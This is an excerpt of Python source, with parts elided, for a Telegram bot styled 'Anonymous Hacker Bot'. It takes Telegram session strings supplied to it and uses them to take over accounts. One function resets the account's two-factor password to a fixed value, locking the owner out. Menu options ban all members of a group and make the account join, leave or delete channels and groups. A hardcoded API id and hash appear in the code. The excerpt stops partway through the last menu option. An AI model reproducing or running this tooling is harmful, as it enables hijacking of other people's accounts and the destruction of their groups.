...
client = TelegramClient('Anonymous', api_id, api_hash).start(bot_token=token)
...
async def user2fa(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    try:
      await X.edit_2fa('ANONYMOUSISBEST')
      return True
    except:
      return False
...
async def start(event):
  ...
  async with bot.conversation(event.chat_id) as x:
    ...
    if res.text == "A":
      ...
      await event.reply("Banning all members Tʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ Aɴᴏɴʏᴍᴏᴜs Hᴀᴄᴋᴇʀ Bᴏᴛ")
    elif r == "D":
      await x.send_message("Gɪᴠᴇ Sᴛʀɪɴɢ Sᴇssɪᴏɴ.")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      await event.reply("Joined the Channel/Group Tʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ Aɴᴏɴʏᴍᴏᴜs Hᴀᴄᴋᴇʀ Bᴏᴛ")
    elif r == "F":
      await x.send_message("Gɪᴠᴇ Sᴛʀɪɴɢ Sᴇssɪᴏɴ.")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      await event.reply("Leaved the Channel/Group Tʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ Aɴᴏɴʏᴍᴏᴜs Hᴀᴄᴋᴇʀ Bᴏᴛ")
    elif r == "G":
      await x.send_message("Gɪᴠᴇ Sᴛʀɪɴɢ Sᴇssɪᴏɴ.")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      await event.reply("Deleted the Channel/Group Tʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ Aɴᴏɴʏᴍᴏᴜs Hᴀᴄᴋᴇʀ Bᴏᴛ")
    elif r == "H":
      await x.send_message("Gɪᴠᴇ Sᴛʀɪɴɢ Sᴇssɪᴏɴ.")
      strses = await x.get_response()
      op = await cu(strses.text)
